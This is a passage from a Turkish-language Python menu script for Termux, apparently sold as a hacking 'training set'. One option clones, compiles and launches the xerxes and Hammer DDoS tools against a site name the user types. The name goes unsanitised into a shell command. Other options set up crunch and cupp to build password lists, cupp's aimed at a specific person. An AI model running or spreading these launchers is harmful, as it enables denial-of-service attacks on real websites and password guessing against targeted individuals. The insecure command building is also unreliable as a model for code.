DDOS Atmak İçin Bir Sürü Tool Var Ama Biz Bazılarını Özel Olarak Ayırıyoruz
Daha Fazla Ayrıntı İçin Dökümanlara Göz Atabilirsiniz.

Size 2 Tool Göstereceğim İkiside Güzel Araçlar

1)xerxes
2)Hammer
""")
	dev = input("Seçim Yapınız: ")
	if dev=="1":
		os.system("clear")
		os.system("pkg install git")
		os.system("pkg install clang")
		os.chdir("/data/data/com.termux/files/home")
		os.system("git clone https://github.com/zanyarjamal/xerxes")
		os.chdir("/data/data/com.termux/files/home/xerxes")
		os.system("chmod 777 xerxes.c")
		os.system("clang xerxes.c -o xerxes")
		os.system("clear")
		t = input("Tool Kuruldu DDOS Atmak İstermisiniz [E/h]  ")
		if t=="e" or t=="E":
			d = input("Site Adı Giriniz: ")
			os.system("./xerxes " + d + " 80")

	elif dev=="2":
		os.system("clear")
		os.system("pkg install git")
		os.chdir("/data/data/com.termux/files/home")
		os.system("git clone https://github.com/cyweb/hammer.git")
		os.chdir("/data/data/com.termux/files/home/hammer")
		t = input("Tool Kuruldu DDOS Atmak İstermisiniz [E/h]  ")
		if t=="e" or t=="E":
			d = input("Site Adı Giriniz: ")
			os.system("python3 hammer.py -s " + d + "-p 80 -t 200")
	elif dev=="h" or dev=="H":
        	exit()

elif ilk=="18":
	os.system("clear")
	print("""\033[1m\033[92m
Benim Olmayan Ama Sanalcı Arkadaşlarımın Hazırlamış Olduğu Methodlar
Hack Yöntemleri Ve Daha Bir Sürü Bilgi Buradaki Linklerden Ulaşabilirsiniz

Yaman Efkarın Videolu seti

https://www.turkhackteam.org/google-android/1750135-termux-nedir-termux-hack-paketi.html


Saepin Eğitim Seti Var Dökümanlarda Bulabilirsiniz
""")

elif ilk=="19":
	os.system("clear")
	print("""\033[1m\033[92m
Parola Listesi Oluşturmak İçin Araçlar Var wordlist Adında
Bir Araç Var Ama Biz crunch Aracını Kullanıcağız

apt install crunch Diyerek Kurabilirsiniz

Nasıl Kullanılır

crunch "min kaç hane" "max kaç hane" "kullanılacak karakterler" -o "dosya adı.txt"

""")

elif ilk=="20":
	os.system("clear")
	print("""\033[1m\033[92m
Kişiye özel şifre listesi oluşturmak için cupp isimli aracı kullanacağız
Kısaca size cupp aracından bahsedeyim cupp Ortak Kullanıcı Parolaları Profilcisi anlamına gelir 
Bu araç lisans penetrasyon testleri veya adli suç soruşturmaları gibi birçok durumda kullanılabilir, 
CUPP bir platformdur ve Python’da yazılmıştır ve çalışması basit ama çok güçlü sonuçlarla.
Bu uygulama, bir bireye göre uyarlanmış hedeflenmiş şifre sözlükleri oluşturma konusunda bir sosyal mühendisin en iyi arkadaşıdır.-Cupp asyfasından alıntıdır.""")
	dev = input("Devam Edilsin mi [E/h] ")
	if dev=="E" or dev=="e":
		os.system("clear")
		print("Önce Gereken Aracı İndirelim")
		os.system("sleep 2")
		os.chdir("/data/data/com.termux/files/home")
		os.system("clear")
		os.system("git clone https://github.com/Mebus/cupp")
		os.chdir("/data/data/com.termux/files/home/cupp")
		os.system("chmod 777 *")
		os.system("clear")
		print("""\033[1m\033[92m
Şuan Aracımız Kuruldu Bu yazıdan Sonra "cd" yazıp ana dizine gidin sonra "cd cupp" yazıp dosyaya gidin "ls" yazıp dizini görüntüleyin ve 
"python3 cupp.py" yazın gelen yerlerde bbilgileri doldurun en sonsa ise wordlist adını yazın ve wordlistiniz hazır""")
	elif dev=="h" or dev=="H":
        	exit()

elif ilk=="21":
	print("""\033[1m
\033[92m Yapımcılar (Makro-Saep) Eğitim setini aldığın için teşekkürler ilk eğitim setimizdi 
takıldığın bir yer olursa instagramdan yazmayı unutma!!!
İnstagram adreslerimiz =  @saep_official_ / _m4kr0""")
elif ilk=="q" or "Q":
        os.system("clear")